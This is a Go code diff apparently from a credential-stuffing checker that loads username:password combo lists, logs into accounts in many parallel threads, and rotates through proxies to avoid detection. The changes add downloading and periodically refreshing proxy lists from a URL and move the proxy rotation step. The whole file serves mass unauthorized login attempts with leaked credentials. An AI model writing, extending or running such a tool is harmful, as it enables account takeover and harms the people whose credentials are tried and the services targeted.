@@ -102,13 +102,16 @@ type AuthData struct {
 
 // Resources ...
 type Resources struct {
-	combosPath string
-	proxyPath  string
-	proxyType  string
-	threads    int
-	timeout    int
-	combos     []string
-	proxies    []string
+	combosPath        string
+	proxyPath         string
+	proxyType         string
+	threads           int
+	timeout           int
+	combos            []string
+	proxies           []string
+	combosLen         int
+	proxiesLen        int
+	proxiesUpdateTime int
 }
 
 // Auther ...
@@ -124,6 +127,24 @@ func init() {
 	for i := 0; i < len(headersSlice); i++ {
 		splited := strings.Split(headersSlice[i], ": ")
 		headers.Add(splited[0], splited[1])
+	}
+}
+
+func getProxies() {
+	resp, err := http.Get(resources.proxyPath)
+	if err != nil {
+		fmt.Println(err)
+	}
+	defer resp.Body.Close()
+	body, _ := ioutil.ReadAll(resp.Body)
+	resources.proxies = strings.Split(string(body), "\n")
+	resources.proxiesLen = len(resources.proxies)
+}
+
+func updateProxies() {
+	for {
+		go getProxies()
+		time.Sleep(time.Duration(resources.proxiesUpdateTime) * time.Second)
 	}
 }
 
@@ -145,6 +166,24 @@ func askForRes(resources *Resources) {
 		resources.proxyPath = scanner.Text()
 	}
 
+	// Check if proxyPath is url, then updating it every n seconds
+	// or just gets it from local path
+	if strings.Contains(resources.proxyPath, "http://") ||
+		strings.Contains(resources.proxyPath, "https://") {
+		fmt.Print("Proxies update time (in seconds): ")
+		if scanner.Scan() {
+			resources.proxiesUpdateTime, err = strconv.Atoi(scanner.Text())
+			if err != nil {
+				fmt.Println(err)
+			}
+		}
+	} else {
+		resources.proxies, err = readLines(resources.proxyPath)
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+
 	fmt.Print("Proxy type: ")
 	if scanner.Scan() {
 		resources.proxyType = scanner.Text()
@@ -164,11 +203,8 @@ func askForRes(resources *Resources) {
 	if err != nil {
 		log.Fatal(err)
 	}
-
-	resources.proxies, err = readLines(resources.proxyPath)
-	if err != nil {
-		log.Fatal(err)
-	}
+	resources.proxiesLen = len(resources.proxies)
+	resources.combosLen = len(resources.combos)
 }
 
 func main() {
@@ -176,19 +212,29 @@ func main() {
 
 	askForRes(&resources)
 
-	proxiesLen, combosLen := len(resources.proxies), len(resources.combos)
-
 	proxyIndex := 0
 
 	wp := workerpool.New(resources.threads)
 
-	bar := pb.Full.Start(combosLen)
+	bar := pb.Full.Start(resources.combosLen)
 	bar.SetRefreshRate(time.Millisecond)
 
 	// Setting standart bar template
 	tmpl := `{{string . "prefix"}}{{counters . }} {{bar . }} {{percent . }} {{speed . }} {{etime . "%s"}}/{{rtime . "%s"}}`
 
 	bar.SetTemplateString(tmpl)
+
+	// Launching new gorutine to update proxies by url every n seconds
+	if resources.proxiesUpdateTime != 0 {
+		go updateProxies()
+	}
+
+	// Checking if proxies are ready
+	for {
+		if len(resources.proxies) > 0 {
+			break
+		}
+	}
 
 	// Iterating combos
 	for i, combo := range resources.combos {
@@ -202,6 +248,12 @@ func main() {
 			user, pass := array[0], array[1]
 			conn := false
 			for !conn {
+				// Check if proxyIndex is not bigger then whole proxies length
+				if proxyIndex == resources.proxiesLen-1 {
+					proxyIndex = 0
+				} else {
+					proxyIndex++
+				}
 				proxy := resources.proxies[proxyIndex]
 				authData := AuthData{
 					Phone:     user,
@@ -211,12 +263,6 @@ func main() {
 				}
 				result, accountInfo := authData.Login()
 				conn = authData.WorkWithAccount(result, accountInfo, i)
-				// Check if proxyIndex is not bigger then whole proxies length
-				if proxyIndex == proxiesLen-1 {
-					proxyIndex = 0
-				} else {
-					proxyIndex++
-				}
 			}
 			// Change bar status every request
 			bar.Increment()
